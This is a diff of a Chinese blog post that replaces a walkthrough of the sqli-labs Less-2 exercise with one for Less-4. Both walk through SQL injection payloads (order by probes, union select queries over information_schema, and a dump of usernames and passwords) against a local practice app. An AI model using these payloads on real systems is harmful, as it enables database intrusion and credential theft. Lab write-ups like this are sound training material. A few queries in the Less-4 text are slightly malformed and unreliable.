@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" >
 
-<title>Less-2 | LoveCtrl-Tan</title>
+<title>Less-4 | LoveCtrl-Tan</title>
 <meta name="description" content="温故而知新">
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
@@ -92,51 +92,47 @@
       <div class="main-container">
         <div class="content-container" data-aos="fade-up">
           <div class="post-detail">
-            <h2 class="post-title">Less-2</h2>
-            <div class="post-date">2019-10-17</div>
+            <h2 class="post-title">Less-4</h2>
+            <div class="post-date">2019-10-19</div>
             
             <div class="post-content">
-              <p>打开网站，照例输入<code>?id=1</code><br>
-<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/1571308548179.png" alt=""><br>
-输入<code>?id=1'</code>判断<br>
-<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/1571308589194.png" alt=""><br>
-根据错误提示可以看出单引号<code>'</code>没有被带入查询<br>
-接着输入<code>?id=1 and 1=1--+</code>和<code>?id=1 and 1=2--+</code>判断<br>
-<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/1571308758929.png" alt=""><br>
-<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/1571308773379.png" alt=""><br>
-通过返回结果判断可能存在SQL注入漏洞<br>
-接着判断数据表的字段数量<code>?id=1 order by 1--+</code><br>
-<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/1571308884554.png" alt=""><br>
-<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/1571308898785.png" alt=""><br>
-判断字节数为3<br>
-接着爆数据库名</p>
-<pre><code class="language-url">http://127.0.0.1/sql1/Less-2/?id=-1 union select 1,database(),3--+
+              <p><img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191019172428.png" alt=""><br>
+我们继续输入<code>?id=1</code>,首先我们来判断是否存在SQL注入漏洞，按照提示我们构建<code>?id&quot;) and 1=1--+</code>和<code>?id=1&quot;) and 1=2--+</code><br>
+<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191019172704.png" alt=""><br>
+<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191019172713.png" alt=""><br>
+我们可以初步判断出它可能存在SQL漏洞，接下来我们来用<code>order by</code>来判断数据表的字段数量<br>
+<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191019173041.png" alt=""><br>
+<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191019173024.png" alt=""><br>
+该数据表的字段数量为<code>3</code>接下来我们来利用联合查询<code>union select 1,database(),3--+</code>查询数据库名<br>
+<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191019173308.png" alt=""><br>
+获取库名后，我们构造以下函数来查询表名</p>
+<pre><code class="language-URL">select table_name from information_schema.tables where table_schema='security' limit 0,1
 </code></pre>
-<p><img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/1571309026211.png" alt=""><br>
-接着爆表名</p>
-<pre><code class="language-url">?id=-1 union select 1,(select table_name from information_schema.tables where table_schema='security' limit 3,1),3--+
+<p>当我们查询到<code>3</code>后可以看到<br>
+<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191019202120.png" alt=""><br>
+知道了库名和表名之后，我们开始查询字段名，我们构造以<code>users</code>表名的查询语句</p>
+<pre><code class="language-URL">select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1
 </code></pre>
-<p><img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/1571309265992.png" alt=""><br>
-爆字段名</p>
-<pre><code class="language-url">?id=-1 union select 1,(select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 1,1),3--+
+<p>当我们查询到<code>2,3</code>时，我们可以看到<br>
+<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191019203001.png" alt=""><br>
+<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191019203013.png" alt=""><br>
+现在我们知道了库名,表名，字段名.我们就可以构造SQL语句查询数据库的数据<br>
+我们在<code>2,3</code>的位置插入</p>
+<pre><code class="language-URL">select username(password) from security.users limit 0,1
 </code></pre>
-<p><img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/1571309432766.png" alt=""><br>
-<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/1571309435706.png" alt=""><br>
-查询字段<code>username``password</code>对应的数据</p>
-<pre><code class="language-url">?id=1 union select 1,(select username from security.users limit 0,1),(select password from security.users limit 0,1)--+
-</code></pre>
-<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/1571309618685.png" alt=""></figure>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191019203303.png" alt=""></figure>
 
             </div>
             
-              <div class="tag-container">
-                
-                  <a href="https://lovectrl-tan.github.io/tag/TsvpyGUuc" class="tag">
-                    SQL
-                  </a>
-                
-              </div>
             
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://lovectrl-tan.github.io/post/sql-labs">
+                  <h3 class="post-title">
+                    SQL-LABS
+                  </h3>
+                </a>
+              </div>
             
 
             
